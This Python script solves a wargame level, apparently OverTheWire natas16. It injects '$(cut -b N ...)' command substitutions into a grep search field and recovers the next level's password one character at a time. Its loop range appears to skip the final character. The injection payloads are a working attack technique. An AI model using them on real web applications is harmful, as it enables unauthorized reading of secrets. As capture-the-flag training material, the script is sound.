"""
natas16: shell injection, more filtering
"""

import requests
from bs4 import BeautifulSoup
from typing import List, Optional

from natas_utils import *

LEVEL = 16

def solve(url: str, login: LevelLogin) -> Optional[str]:
    flag = ""

    # passwords are all the same length
    for offset in range(1, len(NATAS_DATA["logins"][16]["password"])):
        c = extract_character(url, login, offset)
        if not c:
            return None
        flag += c
        print(flag)

    return try_level_login(LEVEL + 1, [flag])

def extract_character(url: str, login: LevelLogin, offset: int) -> Optional[str]:
    flag_file_abspath = NATAS_DATA['flag_path'] + f"natas{LEVEL + 1}"

    # Preliminary payload: match first chars of words against selected char in password.
    # the `cut` utility allows extraction of single bytes per line
    # using 1-indexed offsets
    payload = f"^$(cut -b {offset} {flag_file_abspath})"

    params = {
        "needle": payload,
        "submit": "Search",
    }
    response = requests.get(url, auth=login, params=params)
    results = get_grep_output(response)

    if len(results) > 0:
        return results[0][0]
    else:
        # if no character match, char is likely a digit
        # Digit payload: match against word length.
        digit_payload_main = f"$(cut -b {offset} {flag_file_abspath})" + "\\}$"
        digit_payload = "^.\\{" + digit_payload_main
        params["needle"] = digit_payload

        response_single = requests.get(url, auth=login, params=params)
        results = get_grep_output(response_single)

        # no 0-length words, check for 0 by pre-pending a 1
        if not len(results) > 0:
            digit0_payload = "^.\\{1" + digit_payload_main
            params["needle"] = digit0_payload

            response_0 = requests.get(url, auth=login, params=params)
            results = get_grep_output(response_0)

        # now if the results are still empty, something has gone wrong
        return None if not len(results) > 0 else str(len(results[0]))[-1]


def get_grep_output(response: requests.Response) -> List[str]:
    soup = BeautifulSoup(response.text, "html.parser")

    # results are in the only <pre> element on the page, one word per line
    return soup.find("pre").text.split()

if __name__ == "__main__":
    url, login = load_level(LEVEL)
    flag = solve(url, login)

    if flag:
        print("natas{:02}:".format(LEVEL + 1), flag)
        store_level_password(LEVEL + 1, flag)
    else:
        exit("Failed to get password for natas{:02}.".format(LEVEL + 1))